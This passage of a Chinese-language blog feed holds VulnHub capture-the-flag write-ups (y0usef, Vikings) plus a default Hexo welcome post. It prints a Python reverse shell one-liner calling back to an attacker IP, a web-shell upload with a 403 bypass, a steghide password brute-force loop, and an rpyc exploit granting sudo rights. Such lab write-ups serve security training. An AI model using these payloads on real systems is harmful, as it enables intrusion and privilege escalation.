alt="image-20220216115304086"></p><p>访问a.php（上传后修改了名字）</p><p><code>http://192.168.137.233/adminstration/upload/files/1644983531a.php</code></p><p>记得添加X-Forwarded-For绕过403</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115527530.png" alt="image-20220216115527530"></p><p>页面访问成功为空</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115622776.png" alt="image-20220216115622776"></p><p>尝试执行命令</p><p>查看当前用户</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216115804186.png" alt="image-20220216115804186"></p><p>为普通权限用户</p><h2 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h2><h3 id="查看目标服务器上是否有python"><a href="#查看目标服务器上是否有python" class="headerlink" title="查看目标服务器上是否有python"></a>查看目标服务器上是否有python</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216120212970.png" alt="image-20220216120212970"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.137.22&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>kali开启侦听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143055578.png" alt="image-20220216143055578"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216142807426.png" alt="image-20220216142807426"></p><p>成功反弹shell</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143312167.png" alt="image-20220216143312167"></p><p>查看&#x2F;etc&#x2F;passwd文件</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143455257.png" alt="image-20220216143455257"></p><p>查看&#x2F;home目录</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143717439.png" alt="image-20220216143717439"></p><p>拿到第一个flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=</span><br></pre></td></tr></table></figure><h3 id="SSH登陆"><a href="#SSH登陆" class="headerlink" title="SSH登陆"></a>SSH登陆</h3><p>尝试base64解码</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216143832430.png" alt="image-20220216143832430"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh : </span><br><span class="line">user : yousef </span><br><span class="line">pass : yousef123</span><br></pre></td></tr></table></figure><p>解码完成后信息显示是ssh的账号密码（之前端口扫描确实存在22端口的ssh）</p><p>尝试连接</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144327107.png" alt="image-20220216144327107"></p><h3 id="利用sudo提权"><a href="#利用sudo提权" class="headerlink" title="利用sudo提权"></a>利用sudo提权</h3><p>用户yousef有sudo权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现可以sudo执行所有命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216144942569.png" alt="image-20220216144942569"></p><p>(这里提权太简单了..)</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145157998.png" alt="image-20220216145157998"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220216145226424.png" alt="image-20220216145226424"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;靶机地址：&lt;/strong&gt;&lt;a href=&quot;https://download.vulnhub.com/y0usef/y0usef.ova&quot;&gt;https://download.vulnhub.com/y0usef/y0usef.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难度等级：&lt;/strong&gt;低&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打靶目标：&lt;/strong&gt;取得 root 权限 + 2 Flag&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>VulnHub-9-Vikings</title>
    <link href="http://example.com/2022/04/12/week9/"/>
    <id>http://example.com/2022/04/12/week9/</id>
    <published>2022-04-12T07:08:39.631Z</published>
    <updated>2022-04-12T07:11:41.051Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>靶机地址：</strong><a href="https://download.vulnhub.com/vikings/Vikings.ova">https://download.vulnhub.com/vikings/Vikings.ova</a></p><p><strong>难度等级：</strong>低（中）</p><p><strong>打靶目标：</strong>取得 root 权限 + 2 Flag</p></blockquote><span id="more"></span><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092702262.png" alt="image-20220217092702262"></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.137.123</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092741148.png" alt="image-20220217092741148"></p><h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80 -sV -sC 192.168.137.123</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092915869.png" alt="image-20220217092915869"></p><h3 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092948159.png" alt="image-20220217092948159"></p><p>点击进入site&#x2F;</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217093037864.png" alt="image-20220217093037864"></p><p>将页面上的信息进行翻译</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222111544143.png" alt="image-20220222111544143"></p><p>查看源码</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217093454464.png" alt="image-20220217093454464"></p><p>发现页面加载过程中请求了一些js脚本（所以加载较慢），但未发现可利用的信息</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>对网站根目录进行目录扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.137.123/ -x txt,html,php -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112350381.png" alt="image-20220222112350381"></p><p>对&#x2F;site进行目录扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.137.123/site/ -x txt,html,php -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112536698.png" alt="image-20220222112536698"></p><p>发现war.txt，尝试访问</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112823666.png" alt="image-20220222112823666"></p><p>发现该文件内写了类似的路径，继续访问该路径</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112919502.png" alt="image-20220222112919502"></p><h3 id="编码转化"><a href="#编码转化" class="headerlink" title="编码转化"></a>编码转化</h3><p>发现了大量编码，尝试解码</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113016678.png" alt="image-20220222113016678"></p><p>解码后依然很混乱，但是发现开头PK像是文件头，使用熵辅助验证（Entropy模块）</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113409855.png" alt="image-20220222113409855"></p><p> 熵值大于7.5则大概率是人为创建的，使用Detect File Type模块判断类型</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113620160.png" alt="image-20220222113620160"></p><p>该文件应该为一个压缩格式的文件</p><p>将其以压缩文件格式保存在本地</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152117585.png" alt="image-20220223152117585"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152138688.png" alt="image-20220223152138688"></p><p>打开时发现需要密码解压</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152314142.png" alt="image-20220223152314142"></p><h3 id="离线破解zip密码"><a href="#离线破解zip密码" class="headerlink" title="离线破解zip密码"></a>离线破解zip密码</h3><p>使用zip2john将a.zip转换为hash</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152747104.png" alt="image-20220223152747104"></p><p>复制字典 使用john破解</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153101010.png" alt="image-20220223153101010"></p><h3 id="隐写图片信息提取"><a href="#隐写图片信息提取" class="headerlink" title="隐写图片信息提取"></a>隐写图片信息提取</h3><p>解压出一张图片 平平无奇</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153714291.png" alt="image-20220223153714291"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153736524.png" alt="image-20220223153736524"></p><p>猜测有没有可能和图片隐写相关</p><p>使用steghide查看是否存在隐藏信息</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223154437101.png" alt="image-20220223154437101"></p><p>发现需要输入密码 初步尝试使用弱口令 未能试出密码</p><p>可以尝试使用简单的脚本进行密码爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat &quot;rockyou.txt&quot;); do steghide extract king -p $i; done</span><br></pre></td></tr></table></figure><h3 id="二进制文件分析提取"><a href="#二进制文件分析提取" class="headerlink" title="二进制文件分析提取"></a>二进制文件分析提取</h3><p>这里使用binwalk二进制分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -B king</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155430641.png" alt="image-20220223155430641"></p><p>分析结果中发现 确实存在压缩文件 有压缩前后大小的信息 且名为user</p><p>使用binwalk进行提取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e king</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155710305.png" alt="image-20220223155710305"></p><p>提取后的zip文件解压后为user文件</p><p>查看user文件的类型 发现为txt文件 则尝试查看文件内容</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155926469.png" alt="image-20220223155926469"></p><p>看到这样的格式不免想到ssh连接 （结合之前端口扫描的22端口） 尝试连接</p><h3 id="ssh登陆floki用户"><a href="#ssh登陆floki用户" class="headerlink" title="ssh登陆floki用户"></a>ssh登陆floki用户</h3><p>经过多次尝试最终使用用户名floki和密码f@m0usboatbuilde7成功登陆</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223161401992.png" alt="image-20220223161401992"></p><h2 id="二、提权"><a href="#二、提权" class="headerlink" title="二、提权"></a>二、提权</h2><h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p>简单查看一下当前权限下系统的文件信息</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223161707403.png" alt="image-20220223161707403"></p><p>发现ragnar用户 之前在web页面的文字信息内有提到过ragnar（维京人的领袖）</p><p>尝试切换到ragnar用户 失败</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su ragnar</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162049251.png" alt="image-20220223162049251"></p><p>尝试自身有无sudo权限 尝试提权为root 结果显示并非sudo组成员 无法提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162131315.png" alt="image-20220223162131315"></p><h3 id="素数查找-x2F-科拉茨猜想"><a href="#素数查找-x2F-科拉茨猜想" class="headerlink" title="素数查找&#x2F;科拉茨猜想"></a>素数查找&#x2F;科拉茨猜想</h3><p>再回到当前目录下的文件readme.txt</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162328006.png" alt="image-20220223162328006"></p><p>根据文本内的线索 查看目录下的boat文件的类型</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162504160.png" alt="image-20220223162504160"></p><p>查看目录下的boat文件的内容</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162525657.png" alt="image-20220223162525657"></p><p>发现伪代码（开发人员方便理解的代码）</p><p>大致意为：</p><blockquote><p>可打印的字符是你的盟友</p><p>将参数num赋值为第29位素数</p><p>对参数num进行科拉茨猜想</p></blockquote><p>用python写一个计算素数的脚本寻找第29个素数为109</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303094526569.png" alt="image-20220303094526569"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303094900556.png" alt="image-20220303094900556"></p><p>用python写一个对109进行科拉茨猜想的脚本，提示中有可打印的字符，ascii编码最大为255故&lt;256</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100126604.png" alt="image-20220303100126604"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100152569.png" alt="image-20220303100152569"></p><p>将打印出来的字符放入CyberChef中</p><p>使用From Decimal模块并设置间隔为逗号，再使用Strings模块并选择长度为1的可打印字符</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100735715.png" alt="image-20220303100735715"></p><p>最终再使用Find&#x2F;Replace模块 将换行符替换为空</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100824928.png" alt="image-20220303100824928"></p><p>得到最终的字符串<code>mR)|&gt;^/Gky[gz=\.F#j5P(</code></p><h3 id="ssh登陆ragnar用户"><a href="#ssh登陆ragnar用户" class="headerlink" title="ssh登陆ragnar用户"></a>ssh登陆ragnar用户</h3><p>尝试使用该字符串作为密码登陆ragnar账号</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104008438.png" alt="image-20220303104008438"></p><p>再次将<code>mR)|&gt;^/Gky[gz=\.F#j5P(</code>粘贴输入</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104318996.png" alt="image-20220303104318996"></p><p>成功登入，提示信息显示ragnar用户也不是root用户，没有sudo权限</p><h3 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h3><p>查看当前目录信息，user.txt内应为第一个flag</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104541477.png" alt="image-20220303104541477"></p><p>查看&#x2F;etc&#x2F;passwd文件</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104737747.png" alt="image-20220303104737747">顺便优化一下shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104824167.png" alt="image-20220303104824167"></p><p>重新思考之前ssh登陆ragnar账号时，登陆成功后仍需再输入密码，怀疑是存在登陆即运行的程序或进程</p><p>查看当前目录下有无隐藏文件</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303105052770.png" alt="image-20220303105052770"></p><h3 id="Rpc漏洞提权"><a href="#Rpc漏洞提权" class="headerlink" title="Rpc漏洞提权"></a>Rpc漏洞提权</h3><p>查看环境变量文件 最终发现在.profile文件内可能存在可利用信息</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303105227689.png" alt="image-20220303105227689"></p><p>发现在ssh登陆后，会安装和配置libpam-umask包，并直接使用<strong>sudo</strong>权限运行了python脚本**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;rpyc_classic.py**</p><p>查看**&#x2F;usr&#x2F;local&#x2F;bin&#x2F;rpyc_classic.py**</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303111707601.png" alt="image-20220303111707601"></p><p>了解一下rpc（服务端、客户端连接方式等）</p><p><a href="https://rpyc.readthedocs.io/en/latest/tutorial/tut1.html">https://rpyc.readthedocs.io/en/latest/tutorial/tut1.html</a></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112050194.png" alt="image-20220303112050194"></p><p>发现可由客户端将函数传输到服务端并执行</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112630757.png" alt="image-20220303112630757"></p><p>查看该文件是否有写权限</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112323137.png" alt="image-20220303112323137"></p><p>普通用户无法写入&#x2F;更改</p><p>整理大致思路：利用客户端可以向服务端传输数据的特性，向服务端传输数据，服务端默认以root权限执行，利用此特性，将ragnar用户添加到sudo组</p><p>编写exp</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161022685.png" alt="image-20220303161022685"></p><blockquote><p>import rpyc<br>def shell():<br>   import os<br>   os.system(“sudo usermod -a -G sudo ragnar”)<br>conn &#x3D; rpyc.classic.connect(“localhost”)<br>fn &#x3D; conn.teleport(shell)<br>fn()</p></blockquote><p>查看Rpyc文档内提到的默认服务端口18812是否在本机开启</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303154936087.png" alt="image-20220303154936087"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -pantu | grep 18812</span><br></pre></td></tr></table></figure><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303155200284.png" alt="image-20220303155200284"></p><p>结果显示服务端口18812的状态是开启，也就说明服务端是在运行的</p><p>执行exp，并重新使用ssh登陆ragnar账号，验证是否成功</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303160356664.png" alt="image-20220303160356664"></p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161344973.png" alt="image-20220303161344973"></p><p>页面提示要以管理员身份运行命令，使用sudo执行命令，这里使用<code>sudo -s</code> 执行环境变数中的 SHELL</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161509841.png" alt="image-20220303161509841"></p><h3 id="Flag2"><a href="#Flag2" class="headerlink" title="Flag2"></a>Flag2</h3><p>最终成功提权至root权限并获取第二个flag</p><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161726600.png" alt="image-20220303161726600"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;靶机地址：&lt;/strong&gt;&lt;a href=&quot;https://download.vulnhub.com/vikings/Vikings.ova&quot;&gt;https://download.vulnhub.com/vikings/Vikings.ova&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;难度等级：&lt;/strong&gt;低（中）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;打靶目标：&lt;/strong&gt;取得 root 权限 + 2 Flag&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2022/04/12/hello-world/"/>
    <id>http://example.com/2022/04/12/hello-world/</id>
    <published>2022-04-12T07:02:12.926Z</published>
    <updated>2022-04-12T07:02:12.926Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
